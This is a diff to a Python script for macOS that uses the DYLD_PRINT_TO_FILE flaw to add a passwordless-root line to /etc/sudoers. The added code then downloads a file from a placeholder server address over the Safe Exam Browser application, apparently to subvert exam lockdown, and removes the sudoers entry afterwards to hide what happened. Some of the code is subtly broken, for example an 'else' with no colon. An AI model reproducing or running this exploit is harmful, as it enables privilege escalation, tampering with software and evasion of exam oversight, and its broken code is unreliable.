@@ -1,7 +1,6 @@
 #!/usr/bin/python
-import os,time,sys,subprocess
+import os,time,sys,subprocess,urllib
 whoami = subprocess.check_output(['whoami'])
-os.system(" mkdir ~/tmp")
 systemver = subprocess.check_output(['sw_vers', '-productVersion'])
 
 def libmalloc():
@@ -28,4 +27,9 @@ def libmalloc():
 if "10.10.5" in systemver:
 	libmalloc()
 else
-	os.write(3,\ALL ALL=(ALL) NOPASSWD: ALL\")"' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp
+	os.system(" echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp")
+rootcheck = subprocess.check_output(['sudo visudo'])
+if "denied" in rootcheck:
+	os.close(1)
+urllib.urlretrieve ("serverAddress", "/Applications/Safe\ Exam\ Browser.app")
+os.system("sudo sed -i "" \"/NOPASSWD:ALL/d\" /etc/sudoers")
